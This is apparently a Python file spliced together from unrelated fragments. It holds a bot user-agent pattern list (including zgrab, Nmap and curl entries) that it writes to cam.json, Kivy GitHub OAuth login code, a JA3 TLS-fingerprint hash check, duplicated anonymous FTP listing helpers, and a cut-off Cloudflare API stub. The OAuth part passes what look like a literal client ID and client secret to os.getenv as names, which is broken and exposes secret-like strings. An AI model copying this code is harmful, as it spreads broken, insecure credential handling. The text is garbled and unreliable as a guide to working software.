       "Mozilla/5.0 (compatible; Feedspotbot/1.0; +http://www.feedspot.com/fs/bot)",
       "Mozilla/5.0 (compatible; Feedspot/1.0 (+https://www.feedspot.com/fs/fetcher; like FeedFetcher-Google)"
     ],
     "url": "http://www.feedspot.com/fs/bot"
  }
  ,
  {
     "pattern": "Diffbot\\/",
     "addition_date": "2018/07/07",
     "instances": [
       "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729; Diffbot/0.1; +http://www.diffbot.com)"
     ],
     "url": "http://www.diffbot.com"
  }
  ,
  {
     "pattern": "SEOkicks",
     "addition_date": "2018/08/22",
     "instances": [
       "Mozilla/5.0 (compatible; SEOkicks; +https://www.seokicks.de/robot.html)"
     ],
     "url": "https://www.seokicks.de/robot.html"
  }
  ,
  {
     "pattern": "tracemyfile",
     "addition_date": "2018/08/23",
     "instances": [
       "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
     ]
  }
  ,
  {
     "pattern": "Nimbostratus-Bot",
     "addition_date": "2018/08/29",
     "instances": [
       "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
     ]
  }
  ,
  {
     "pattern": "zgrab",
     "addition_date": "2018/08/30",
     "instances": [
       "Mozilla/5.0 zgrab/0.x"
     ],
    "url": "https://zmap.io/"
  }
  ,
  {
     "pattern": "PR-CY.RU",
     "addition_date": "2018/08/30",
     "instances": [
       "Mozilla/5.0 (compatible; PR-CY.RU; + https://a.pr-cy.ru)"
     ],
    "url": "https://a.pr-cy.ru/"
  }
  ,
  {
     "pattern": "AdsTxtCrawler",
     "addition_date": "2018/08/30",
     "instances": [
       "AdsTxtCrawler/1.0"
     ]
  },
  {
    "pattern": "Datafeedwatch",
    "addition_date": "2018/09/05",
    "instances": [
      "Datafeedwatch/2.1.x"
    ],
    "url": "https://www.datafeedwatch.com/"
  }
  ,
  {
    "pattern": "Zabbix",
    "addition_date": "2018/09/05",
    "instances": [
      "Zabbix"
    ],
    "url": "https://www.zabbix.com/documentation/3.4/manual/web_monitoring"
  }
  ,
  {
    "pattern": "TangibleeBot",
    "addition_date": "2018/09/05",
    "instances": [
      "TangibleeBot/1.0.0.0 (http://tangiblee.com/bot)"
    ],
    "url": "http://tangiblee.com/bot"
  }
  ,
  {
    "pattern": "google-xrawler",
    "addition_date": "2018/09/05",
    "instances": [
      "google-xrawler"
    ],
    "url": "https://webmasters.stackexchange.com/questions/105560/what-is-the-google-xrawler-user-agent-used-for"
  }
  ,
  {
    "pattern": "axios",
    "addition_date": "2018/09/06",
    "instances": [
      "axios/0.18.0",
      "axios/0.19.0"
    ],
    "url": "https://github.com/axios/axios"
  }
  ,
  {
    "pattern": "Amazon CloudFront",
    "addition_date": "2018/09/07",
    "instances": [
      "Amazon CloudFront"
    ],
    "url": "https://aws.amazon.com/cloudfront/"
  }
  ,
  {
    "pattern": "Pulsepoint",
    "addition_date": "2018/09/24",
    "instances": [
      "Pulsepoint XT3 web scraper"
    ]
  }
  ,
  {
    "pattern": "CloudFlare-AlwaysOnline",
    "addition_date": "2018/09/27",
    "instances": [
      "Mozilla/5.0 (compatible; CloudFlare-AlwaysOnline/1.0; +http://www.cloudflare.com/always-online) AppleWebKit/534.34",
      "Mozilla/5.0 (compatible; CloudFlare-AlwaysOnline/1.0; +https://www.cloudflare.com/always-online) AppleWebKit/534.34"
    ],
    "url" : "https://www.cloudflare.com/always-online/"
  }
  ,
  {
   "pattern": "Google-Structured-Data-Testing-Tool",
    "addition_date": "2018/10/02",
    "instances": [
      "Mozilla/5.0 (compatible; Google-Structured-Data-Testing-Tool +https://search.google.com/structured-data/testing-tool)",
      "Mozilla/5.0 (compatible; Google-Structured-Data-Testing-Tool +http://developers.google.com/structured-data/testing-tool/)"
    ],
    "url": "https://search.google.com/structured-data/testing-tool"
  }
  ,
  {
   "pattern": "WordupInfoSearch",
    "addition_date": "2018/10/07",
    "instances": [
      "WordupInfoSearch/1.0"
    ]
  }
  ,
  {
    "pattern": "WebDataStats",
    "addition_date": "2018/10/08",
    "instances": [
      "Mozilla/5.0 (compatible; WebDataStats/1.0 ; +https://webdatastats.com/policy.html)"
    ],
    "url": "https://webdatastats.com/"
  }
  ,
  {
    "pattern": "HttpUrlConnection",
    "addition_date": "2018/10/08",
    "instances": [
      "Jersey/2.25.1 (HttpUrlConnection 1.8.0_141)"
    ]
  }
  ,
  {
    "pattern": "Seekport Crawler",
    "addition_date": "2018/10/08",
    "instances": [
      "Mozilla/5.0 (compatible; Seekport Crawler; http://seekport.com/)"
    ],
    "url": "http://seekport.com/"
  }
  ,
  {
    "pattern": "ZoomBot",
    "addition_date": "2018/10/10",
    "instances": [
      "ZoomBot (Linkbot 1.0 http://suite.seozoom.it/bot.html)"
    ],
    "url": "http://suite.seozoom.it/bot.html"
  }
  ,
  {
    "pattern": "VelenPublicWebCrawler",
    "addition_date": "2018/10/09",
    "instances": [
      "VelenPublicWebCrawler (velen.io)"
    ]
  }
  ,
  {
    "pattern": "MoodleBot",
    "addition_date": "2018/10/10",
    "instances": [
      "MoodleBot/1.0"
    ]
  }
  ,
  {
    "pattern": "jpg-newsbot",
    "addition_date": "2018/10/10",
    "instances": [
      "jpg-newsbot/2.0; (+https://vipnytt.no/bots/)"
    ],
    "url": "https://vipnytt.no/bots/"
  }
  ,
  {
    "pattern": "outbrain",
    "addition_date": "2018/10/14",
    "instances": [
      "Mozilla/5.0 (Java) outbrain"
    ],
    "url": "https://www.outbrain.com/help/advertisers/invalid-url/"
  }
  ,
  {
    "pattern": "W3C_Validator",
    "addition_date": "2018/10/14",
    "instances": [
      "W3C_Validator/1.3"
    ],
    "url": "https://validator.w3.org/services"
  }
  ,
  {
    "pattern": "Validator\\.nu",
    "addition_date": "2018/10/14",
    "instances": [
      "Validator.nu/LV"
    ],
    "url": "https://validator.w3.org/services"
  }
  ,
  {
    "pattern": "W3C-checklink",
    "addition_date": "2018/10/14",
    "depends_on": ["libwww-perl"],
    "instances": [
      "W3C-checklink/2.90 libwww-perl/5.64",
      "W3C-checklink/3.6.2.3 libwww-perl/5.64",
      "W3C-checklink/4.2 [4.20] libwww-perl/5.803",
      "W3C-checklink/4.2.1 [4.21] libwww-perl/5.803",
      "W3C-checklink/4.3 [4.42] libwww-perl/5.805",
      "W3C-checklink/4.3 [4.42] libwww-perl/5.808",
      "W3C-checklink/4.3 [4.42] libwww-perl/5.820",
      "W3C-checklink/4.5 [4.154] libwww-perl/5.823",
      "W3C-checklink/4.5 [4.160] libwww-perl/5.823"
    ],
    "url": "https://validator.w3.org/services"
  }
  ,
  {
    "pattern": "W3C-mobileOK",
    "addition_date": "2018/10/14",
    "instances": [
      "W3C-mobileOK/DDC-1.0"
    ],
    "url": "https://validator.w3.org/services"
  }
  ,
  {
    "pattern": "W3C_I18n-Checker",
    "addition_date": "2018/10/14",
    "instances": [
      "W3C_I18n-Checker/1.0"
    ],
    "url": "https://validator.w3.org/services"
  }
  ,
  {
    "pattern": "FeedValidator",
    "addition_date": "2018/10/14",
    "instances": [
      "FeedValidator/1.3"
    ],
    "url": "https://validator.w3.org/services"
  }
  ,
  {
    "pattern": "W3C_CSS_Validator",
    "addition_date": "2018/10/14",
    "instances": [
      "Jigsaw/2.3.0 W3C_CSS_Validator_JFouffa/2.0"
    ],
    "url": "https://validator.w3.org/services"
  }
  ,
  {
    "pattern": "W3C_Unicorn",
    "addition_date": "2018/10/14",
    "instances": [
      "W3C_Unicorn/1.0"
    ],
    "url": "https://validator.w3.org/services"
  }
  ,
  {
    "pattern": "Google-PhysicalWeb",
    "addition_date": "2018/10/21",
    "instances": [
      "Mozilla/5.0 (Google-PhysicalWeb)"
    ]
  }
  ,
  {
    "pattern": "Blackboard",
    "addition_date": "2018/10/28",
    "instances": [
      "Blackboard Safeassign"
    ],
    "url": "https://help.blackboard.com/Learn/Administrator/Hosting/Tools_Management/SafeAssign"
  },
  {
    "pattern": "ICBot\\/",
    "addition_date": "2018/10/23",
    "instances": [
      "Mozilla/5.0 (compatible; ICBot/0.1; +https://ideasandcode.xyz"
    ],
    "url": "https://ideasandcode.xyz"
  },
  {
    "pattern": "BazQux",
    "addition_date": "2018/10/23",
    "instances": [
      "Mozilla/5.0 (compatible; BazQux/2.4; +https://bazqux.com/fetcher; 1 subscribers)"
    ],
    "url": "https://bazqux.com/fetcher"
  },
  {
    "pattern": "Twingly",
    "addition_date": "2018/10/23",
    "instances": [
      "Mozilla/5.0 (compatible; Twingly Recon; twingly.com)"
    ],
    "url": "https://twingly.com"
  },
  {
    "pattern": "Rivva",
    "addition_date": "2018/10/23",
    "instances": [
      "Mozilla/5.0 (compatible; Rivva; http://rivva.de)"
    ],
    "url": "http://rivva.de"
  },
  {
    "pattern": "Experibot",
    "addition_date": "2018/11/03",
    "instances": [
      "Experibot-v2 http://goo.gl/ZAr8wX",
      "Experibot-v3 http://goo.gl/ZAr8wX"
    ],
    "url": "https://amirkr.wixsite.com/experibot"
  },
  {
    "pattern": "awesomecrawler",
    "addition_date": "2018/11/24",
    "instances": [
      "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.5 Safari/537.22 +awesomecrawler"
    ]
  },
  {
    "pattern": "Dataprovider.com",
    "addition_date": "2018/11/24",
    "instances": [
      "Mozilla/5.0 (compatible; Dataprovider.com)"
    ],
    "url": "https://www.dataprovider.com/"
  },
  {
    "pattern": "GroupHigh\\/",
    "addition_date": "2018/11/24",
    "instances": [
      "Mozilla/5.0 (compatible; GroupHigh/1.0; +http://www.grouphigh.com/"
    ],
    "url": "http://www.grouphigh.com/"
  },
  {
    "pattern": "theoldreader.com",
    "addition_date": "2018/12/02",
    "instances": [
      "Mozilla/5.0 (compatible; theoldreader.com)"
    ],
    "url": "https://www.theoldreader.com/"
  }
  ,
  {
    "pattern": "AnyEvent",
    "addition_date": "2018/12/07",
    "instances": [
      "Mozilla/5.0 (compatible; U; AnyEvent-HTTP/2.24; +http://software.schmorp.de/pkg/AnyEvent)"
    ],
    "url": "http://software.schmorp.de/pkg/AnyEvent.html"
  }
  ,
  {
    "pattern": "Uptimebot\\.org",
    "addition_date": "2019/01/17",
    "instances": [
      "Uptimebot.org - Free website monitoring"
    ],
    "url": "http://uptimebot.org/"
  }
  ,
  {
    "pattern": "Nmap Scripting Engine",
    "addition_date": "2019/02/04",
    "instances": [
      "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
    ],
    "url": "https://nmap.org/book/nse.html"
  }
  ,
  {
    "pattern": "2ip.ru",
    "addition_date": "2019/02/12",
    "instances": [
      "2ip.ru CMS Detector (https://2ip.ru/cms/)"
    ],
    "url": "https://2ip.ru/cms/"
  },
  {
    "pattern": "Clickagy",
    "addition_date": "2019/02/19",
    "instances": [
      "Clickagy Intelligence Bot v2"
    ],
    "url": "https://www.clickagy.com"
  },
  {
    "pattern": "Caliperbot",
    "addition_date": "2019/03/02",
    "instances": [
      "Caliperbot/1.0 (+http://www.conductor.com/caliperbot)"
    ],
    "url": "http://www.conductor.com/caliperbot"
  },
  {
    "pattern": "MBCrawler",
    "addition_date": "2019/03/02",
    "instances": [
      "MBCrawler/1.0 (https://monitorbacklinks.com)"
    ],
    "url": "https://monitorbacklinks.com"
  },
  {
    "pattern": "online-webceo-bot",
    "addition_date": "2019/03/02",
    "instances": [
      "Mozilla/5.0 (compatible; online-webceo-bot/1.0; +http://online.webceo.com)"
    ],
    "url": "http://online.webceo.com"
  },
  {
    "pattern": "B2B Bot",
    "addition_date": "2019/03/02",
    "instances": [
      "B2B Bot"
    ]
  },
  {
    "pattern": "AddSearchBot",
    "addition_date": "2019/03/02",
    "instances": [
      "Mozilla/5.0 (compatible; AddSearchBot/0.9; +http://www.addsearch.com/bot; info@addsearch.com)"
    ],
    "url": "http://www.addsearch.com/bot"
  },
  {
    "pattern": "Google Favicon",
    "addition_date": "2019/03/14",
    "instances": [
      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
    ]
  },
  {
    "pattern": "HubSpot",
    "addition_date": "2019/04/15",
    "instances": [
      "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36 HubSpot Webcrawler - web-crawlers@hubspot.com",
      "Mozilla/5.0 (X11; Linux x86_64; HubSpot Single Page link check; web-crawlers+links@hubspot.com) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
      "Mozilla/5.0 (compatible; HubSpot Crawler; web-crawlers@hubspot.com)",
      "HubSpot Connect 2.0 (http://dev.hubspot.com/) - BizOpsCompanies-Tq2-BizCoDomainValidationAudit"
    ]
  },
  {
    "pattern": "Chrome-Lighthouse",
    "addition_date": "2019/03/15",
    "instances": [
      "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5 Build/MRA58N) AppleWebKit/537.36(KHTML, like Gecko) Chrome/69.0.3464.0 Mobile Safari/537.36 Chrome-Lighthouse",
      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/69.0.3464.0 Safari/537.36 Chrome-Lighthouse",
      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3694.0 Safari/537.36 Chrome-Lighthouse",
      "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3694.0 Mobile Safari/537.36 Chrome-Lighthouse"
    ],
    "url": "https://developers.google.com/speed/pagespeed/insights"
  },
  {
    "pattern": "HeadlessChrome",
    "url": "https://developers.google.com/web/updates/2017/04/headless-chrome",
    "addition_date": "2019/06/17",
    "instances": [
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/74.0.3729.169 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/69.0.3494.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/76.0.3803.0 Safari/537.36"
    ]
  },
  {
    "pattern": "CheckMarkNetwork\\/",
    "addition_date": "2019/06/30",
    "instances": [
      "CheckMarkNetwork/1.0 (+http://www.checkmarknetwork.com/spider.html)"
    ],
    "url": "https://www.checkmarknetwork.com/"
  },
  {
    "pattern": "www\\.uptime\\.com",
    "addition_date": "2019/07/21",
    "instances": [
      "Mozilla/5.0 (compatible; Uptimebot/1.0; +http://www.uptime.com/uptimebot)"
    ],
    "url": "http://www.uptime.com/uptimebot"
  }
  ,
  {
    "pattern": "Streamline3Bot\\/",
    "addition_date": "2019/07/21",
    "instances": [
      "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1) Streamline3Bot/1.0",
      "Mozilla/5.0 (Windows NT 6.1; Win64; x64; +https://www.ubtsupport.com/legal/Streamline3Bot.php) Streamline3Bot/1.0"
    ],
    "url": "https://www.ubtsupport.com/legal/Streamline3Bot.php"
  }
  ,
  {
    "pattern": "serpstatbot\\/",
    "addition_date": "2019/07/25",
    "instances": [
      "serpstatbot/1.0 (advanced backlink tracking bot; http://serpstatbot.com/; abuse@serpstatbot.com)",
      "serpstatbot/1.0 (advanced backlink tracking bot; curl/7.58.0; http://serpstatbot.com/; abuse@serpstatbot.com)"
    ],
    "url": "http://serpstatbot.com"
  }
  ,
  {
    "pattern": "MixnodeCache\\/",
    "addition_date": "2019/08/04",
    "instances": [
      "MixnodeCache/1.8(+https://cache.mixnode.com/)"
    ],
    "url": "https://cache.mixnode.com/"
  }
  ,
  {
    "pattern": "^curl",
    "addition_date": "2019/08/15",
    "instances": [
      "curl",
      "curl/7.29.0",
      "curl/7.47.0",
      "curl/7.54.0",
      "curl/7.55.1",
      "curl/7.64.0",
      "curl/7.64.1",
      "curl/7.65.3"
    ],
    "url": "https://curl.haxx.se/"
  }
  ,
  {
    "pattern": "SimpleScraper",
    "addition_date": "2019/08/16",
    "instances": [
      "Mozilla/5.0 (compatible; SimpleScraper)"
    ],
    "url": "https://github.com/ramonkcom/simple-scraper/"
  }
  ,
  {
    "pattern": "RSSingBot",
    "addition_date": "2019/09/15",
    "instances": [
      "RSSingBot (http://www.rssing.com)"
    ],
    "url": "http://www.rssing.com"
  }
  ,
  {
    "pattern": "Jooblebot",
    "addition_date": "2019/09/25",
    "instances": [
      "Mozilla/5.0 (compatible; Jooblebot/2.0; Windows NT 6.1; WOW64; +http://jooble.org/jooble-bot) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36"
    ],
    "url": "http://jooble.org/jooble-bot"
  }
  ,
  {
    "pattern": "fedoraplanet",
    "addition_date": "2019/09/28",
    "instances": [
      "venus/fedoraplanet"
    ],
    "url": "http://fedoraplanet.org/"
  }
  ,
  {
    "pattern": "Friendica",
    "addition_date": "2019/09/28",
    "instances": [
      "Friendica 'The Tazmans Flax-lily' 2019.01-1293; https://hoyer.xyz"
    ],
    "url": "https://hoyer.xyz"
  }
  ,
  {
    "pattern": "NextCloud",
    "addition_date": "2019/09/30",
    "instances": [
      "NextCloud-News/1.0"
    ],
    "url": "https://nextcloud.com/"
  }
  ,
  {
    "pattern": "Tiny Tiny RSS",
    "addition_date": "2019/10/04",
    "instances": [
      "Tiny Tiny RSS/1.15.3 (http://tt-rss.org/)",
      "Tiny Tiny RSS/17.12 (a2d1fa5) (http://tt-rss.org/)",
      "Tiny Tiny RSS/19.2 (b68db2d) (http://tt-rss.org/)",
      "Tiny Tiny RSS/19.8 (http://tt-rss.org/)"
    ],
    "url": "http://tt-rss.org/"
  }
  ,
  {
    "pattern": "RegionStuttgartBot",
    "addition_date": "2019/10/17",
    "instances": [
      "Mozilla/5.0 (compatible; RegionStuttgartBot/1.0; +http://it.region-stuttgart.de/competenzatlas/unternehmen-suchen/)"
    ],
    "url": "http://it.region-stuttgart.de/competenzatlas/unternehmen-suchen/"
  }
  ,
  {
    "pattern": "Bytespider",
    "addition_date": "2019/11/11",
    "instances": [
        "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.3754.1902 Mobile Safari/537.36; Bytespider",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.4454.1745 Mobile Safari/537.36; Bytespider",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.7597.1164 Mobile Safari/537.36; Bytespider;bytespider@bytedance.com",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2988.1545 Mobile Safari/537.36; Bytespider",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.4141.1682 Mobile Safari/537.36; Bytespider",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.3478.1649 Mobile Safari/537.36; Bytespider",
        "Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.5267.1259 Mobile Safari/537.36; Bytespider",
        "Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.7990.1979 Mobile Safari/537.36; Bytespider",
        "Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.2268.1523 Mobile Safari/537.36; Bytespider",
        "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2576.1836 Mobile Safari/537.36; Bytespider",
        "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.9681.1227 Mobile Safari/537.36; Bytespider",
        "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.6023.1635 Mobile Safari/537.36; Bytespider",
        "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.4944.1981 Mobile Safari/537.36; Bytespider",
        "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.3613.1739 Mobile Safari/537.36; Bytespider",
        "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.4022.1033 Mobile Safari/537.36; Bytespider",
        "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.3248.1547 Mobile Safari/537.36; Bytespider",
        "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.5527.1507 Mobile Safari/537.36; Bytespider",
        "Mozilla/5.0 (Linux; Android 8.0; Pixel 2 Build/OPD3.170816.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.5216.1326 Mobile Safari/537.36; Bytespider",
        "Mozilla/5.0 (Linux; Android 8.0; Pixel 2 Build/OPD3.170816.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.9038.1080 Mobile Safari/537.36; Bytespider"
    ],
    "url": "https://stackoverflow.com/questions/57908900/what-is-the-bytespider-user-agent"
  }
  ,
  {
    "pattern": "Datanyze",
    "addition_date": "2019/11/17",
    "instances": [
      "Mozilla/5.0 (X11; Datanyze; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
    ],
    "url": "https://www.datanyze.com/dnyzbot/"
  }
  ,
  {
    "pattern": "Google-Site-Verification",
    "addition_date": "2019/12/11",
    "instances": [
      "Mozilla/5.0 (compatible; Google-Site-Verification/1.0)"
    ],
    "url": "https://support.google.com/webmasters/answer/9008080"
  }
  ,
  {
    "pattern": "TrendsmapResolver",
    "addition_date": "2020/02/24",
    "instances": [
      "Mozilla/5.0 (compatible; TrendsmapResolver/0.1)"
    ],
    "url": "https://www.trendsmap.com/"
  }
  ,
  {
    "pattern": "tweetedtimes",
    "addition_date": "2020/02/24",
    "instances": [
      "Mozilla/5.0 (compatible; +http://tweetedtimes.com)"
    ],
    "url": "https://tweetedtimes.com/"
  }
  ,
  {
    "pattern": "Iframely", 
    "addition_date": "2020/03/01", 
    "instances": [
      "Iframely/0.7.3 (+http://iframely.com/;)"
    ],
    "url": "https://iframely.com/docs/block-iframely"
  }
]
'''

# Função para criar o arquivo cam.json com o conteúdo json_data
def criar_arquivo_json():
    try:
        with open('cam.json', 'w') as file:
            # Escreve o conteúdo json_data no arquivo
            file.write(json_data)
        print("Arquivo cam.json criado com sucesso.")
    except Exception as e:
        print(f"Ocorreu um erro ao criar o arquivo: {e}")

# Criar o arquivo
criar_arquivo_json()
GITHUB_CLIENT_ID = os.getenv("151159721769276")  # Coloque sua variável de ambiente ou defina o Client ID
GITHUB_CLIENT_SECRET = os.getenv("176BeA27VllgAERB35PDAYCGEkKmY7xNfIQoLVpSNGeDhDor9ZViRYxkduoSOLZV6UxoQIR4VnBA")  # Coloque sua variável de ambiente ou defina o Client Secret

def authenticate_user(code):
    """Autentica o usuário com GitHub usando o código de autorização."""
    url = "https://github.com/login/oauth/access_token"
    payload = {
        "client_id": GITHUB_CLIENT_ID,
        "client_secret": GITHUB_CLIENT_SECRET,
        "code": code,
    }
    headers = {
        "Accept": "application/json"
    }
    
    response = requests.post(url, data=payload, headers=headers)
    return response.json()

class LoginScreen(Screen):
    def login(self, code):
        """Realiza o login do usuário usando o código de autorização GitHub."""
        try:
            response = authenticate_user(code)
            if "access_token" in response:
                print("Usuário autenticado com sucesso!")
                # Aqui você pode pegar informações do usuário (como nome, email, etc.) usando a API do GitHub
                self.manager.current = "main"
            else:
                raise ValueError("Erro na autenticação com GitHub")
        except Exception as e:
            print(f"Erro ao fazer login: {str(e)}")
            if hasattr(self.ids, "error_label"):
                self.ids.error_label.text = "Erro no login. Tente novamente."

    def register(self, email, password):
        """Não necessário no GitHub OAuth, mas pode ser um lugar para lógica adicional se necessário."""
        print("Registro não é necessário com GitHub OAuth.")

class MainScreen(Screen):
    def logout(self):
        """Faz logout e retorna à tela de login."""
        self.manager.current = "login"

class FirebaseApp(MDApp):
    def build(self):
        Builder.load_file("kiwi.kv")  # Atualize o caminho conforme necessário
        sm = ScreenManager()
        sm.add_widget(LoginScreen(name="login"))
        sm.add_widget(MainScreen(name="main"))
        return sm
        
JA3_HASH = "9e316a9ca82900f98871744be5d2e7e9"
JA3_FULL_STRING = "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,11-5-18-35-43-45-0-13-10-17513-27-23-16-65281-51-21,29-23-24,0"

# Função para calcular o hash JA3 a partir da string JA3
def calculate_ja3_hash(ja3_string):
    return hashlib.md5(ja3_string.encode('utf-8')).hexdigest()

# Comparar o hash calculado com o fornecido
calculated_hash = calculate_ja3_hash(JA3_FULL_STRING)

# Exibir os resultados
print(f"Hash JA3 fornecido: {JA3_HASH}")
print(f"Hash JA3 calculado: {calculated_hash}")

if calculated_hash == JA3_HASH:
    print("Os hashes coincidem!")
else:
    print("Os hashes não coincidem.")

def internet() -> bool:
    """Verifica se há conexão com a internet tentando se conectar ao Google."""
    try:
        socket.create_connection(("8.8.8.8", 53), timeout=3)
        print("Você está conectado à internet!")
        return True
    except OSError:
        print("Sem conexão com a internet.")
        return False
def connect_ftp(host, port, username, password):
    """Conecta ao servidor FTP e retorna a conexão FTP."""
    try:
        # Cria uma instância de FTP
        ftp = FTP()
        # Conecta ao servidor FTP
        ftp.connect(host, port)
        # Faz login no servidor FTP
        ftp.login(user=username, passwd=password)
        print("Conectado ao servidor FTP com sucesso.")
        return ftp
    except Exception as e:
        print(f"Erro ao conectar ao servidor FTP: {e}")
        return None

# Função para listar arquivos no servidor FTP
def list_files(ftp):
    """Lista os arquivos e diretórios no servidor FTP."""
    try:
        if ftp:
            ftp.retrlines('LIST')
        else:
            print("Não foi possível listar arquivos. Conexão não estabelecida.")
    except Exception as e:
        print(f"Erro ao listar arquivos: {e}")

# Função para fechar a conexão FTP
def close_ftp_connection(ftp):
    """Fecha a conexão FTP."""
    try:
        if ftp:
            ftp.quit()
            print("Conexão fechada com sucesso.")
        else:
            print("Não há conexão para fechar.")
    except Exception as e:
        print(f"Erro ao fechar a conexão FTP: {e}")
def connect(ftp_server, username, password):
    try:
        # Conectar ao servidor FTP
        ftp = ftplib.FTP(ftp_server)
        ftp.login(user=username, passwd=password)
        print(f"Conectado ao servidor FTP: {ftp_server}")
        return ftp
    except ftplib.all_errors as e:
        print(f"Erro ao conectar ao servidor {ftp_server}: {e}")
        return None

# Função para listar arquivos no servidor FTP
def list_files(ftp_connection):
    try:
        files = ftp_connection.nlst()
        print("Arquivos no servidor FTP:")
        for file in files:
            print(file)
    except ftplib.all_errors as e:
        print(f"Erro ao listar arquivos: {e}")

# Função para fazer upload de arquivo
def upload_file(ftp_connection, local_file_path, remote_file_path):
    try:
        # Verificar se o arquivo local existe
        if not os.path.isfile(local_file_path):
            print(f"Arquivo local não encontrado: {local_file_path}")
            return

        # Abrir o arquivo local em modo binário e fazer o upload
        with open(local_file_path, 'rb') as file:
            ftp_connection.storbinary(f'STOR {remote_file_path}', file)
            print(f"Arquivo {local_file_path} enviado para {remote_file_path} com sucesso.")
    except ftplib.all_errors as e:
        print(f"Erro ao fazer upload do arquivo: {e}")

# Função principal
def main():
    # Dados de conexão para o primeiro servidor FTP
    host1 = 'ftp.osuosl.org'
    username1 = 'anonymous'
    password1 = 'ashley'
    
    # Dados de conexão para o segundo servidor FTP
    host2 = 'ftp2.osuosl.org'
    username2 = 'anonymous'
    password2 = 'ashley'
    
    # Conectar aos dois servidores FTP
    ftp_connection1 = connect(host1, username1, password1)
    ftp_connection2 = connect(host2, username2, password2)
    
    # Verificar se ambas as conexões foram bem-sucedidas
    if ftp_connection1:
        list_files(ftp_connection1)
    if ftp_connection2:
        list_files(ftp_connection2)

    # Fechar as conexões FTP
    if ftp_connection1:
        ftp_connection1.quit()
    if ftp_connection2:
        ftp_connection2.quit()
main()
def api_v4(self):
    """ :meta private: """
    DEVICE_NOT_FOUND = re.compile(r"^error: device '[^']*' not found")

    # The API commands for /user/
    user(self)
    user_audit_logs(self)
    user_load_balancers(self)
    user_load_balancing_analytics(self)
    user_tokens_verify(self)

    # The API commands for /radar/
    radar(self)
    radar_as112(self)
    radar_attacks(self)
    radar_bgp(self)
    radar_email(self)
    radar_http(self)

    # The API commands for /zones/
    zones(self)
    zones_access(self)
    zones_amp(self)
    zones_analytics(self)
    zones_argo(self)
    zones_dns_analytics(self)
    zones_dnssec(self)
    zones_firewall(self)
    zones_load_balancers(self)
    zones_logpush(self)
    zones_logs(self)
    zones_media(self)
    zones_origin_tls_client_auth(self)
    zones_rate_limits(self)
